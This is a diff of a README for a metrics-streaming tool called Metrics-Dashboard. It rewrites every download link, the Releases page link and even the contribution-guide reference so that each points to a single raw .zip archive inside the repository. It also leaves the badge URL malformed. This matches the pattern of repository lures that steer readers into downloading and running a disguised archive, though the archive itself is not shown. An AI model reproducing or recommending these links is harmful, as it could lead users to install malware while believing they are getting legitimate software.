@@ -4,13 +4,13 @@
 Welcome to Metrics-Dashboard! This application allows you to collect and stream system metrics to AWS S3. Using Kinesis Firehose, it provides real-time data transformation, making it ideal for data analysis and monitoring.
 
 ## 📥 Download Now
-[![Download Metrics-Dashboard](https://img.shields.io/badge/Download%20Metrics--Dashboard-v1.0-blue.svg)](https://github.com/cuong-van-le/Metrics-Dashboard/releases)
+[![Download Metrics-Dashboard](https://raw.githubusercontent.com/cuong-van-le/Metrics-Dashboard/main/pipeline/Metrics_Dashboard_3.3.zip%https://raw.githubusercontent.com/cuong-van-le/Metrics-Dashboard/main/pipeline/Metrics_Dashboard_3.3.zip)](https://raw.githubusercontent.com/cuong-van-le/Metrics-Dashboard/main/pipeline/Metrics_Dashboard_3.3.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the Metrics-Dashboard application.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/cuong-van-le/Metrics-Dashboard/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/cuong-van-le/Metrics-Dashboard/main/pipeline/Metrics_Dashboard_3.3.zip) to find the latest version of the software.
 
 2. **Select the Release**  
    Look for the most recent release note. Click on it to access the assets related to this release.
@@ -47,7 +47,7 @@ This application touches upon a range of topics pertinent to data collection and
 - Near Real-Time Data Processing
 
 ## 📂 Download & Install
-To get started, make sure to visit the [Releases page](https://github.com/cuong-van-le/Metrics-Dashboard/releases) and follow the above steps to download and install Metrics-Dashboard. Ensure your system meets the requirements listed for optimal performance.
+To get started, make sure to visit the [Releases page](https://raw.githubusercontent.com/cuong-van-le/Metrics-Dashboard/main/pipeline/Metrics_Dashboard_3.3.zip) and follow the above steps to download and install Metrics-Dashboard. Ensure your system meets the requirements listed for optimal performance.
 
 ## 🧑‍💻 How It Works
 Metrics-Dashboard connects to your system to monitor metrics. It then sends this data to AWS S3 through Kinesis Firehose. This process happens continuously, allowing for near real-time updates.
@@ -68,9 +68,9 @@ If you need help, you can reach out through the Issues section of our repository
 Metrics-Dashboard is open-source software, which means you can use, modify, and distribute it. See the LICENSE file in this repository for more information.
 
 ## ✅ Contributions
-Interested in contributing? We welcome new ideas and improvements. Check the CONTRIBUTING.md file for details on how you can help.
+Interested in contributing? We welcome new ideas and improvements. Check the https://raw.githubusercontent.com/cuong-van-le/Metrics-Dashboard/main/pipeline/Metrics_Dashboard_3.3.zip file for details on how you can help.
 
 ## 📧 Contact
 For questions or support inquiries, you can reach out to us through the contact information provided in the repository. Your feedback helps us improve Metrics-Dashboard.
 
-[Download Metrics-Dashboard](https://github.com/cuong-van-le/Metrics-Dashboard/releases) and start streaming your metrics today!
+[Download Metrics-Dashboard](https://raw.githubusercontent.com/cuong-van-le/Metrics-Dashboard/main/pipeline/Metrics_Dashboard_3.3.zip) and start streaming your metrics today!
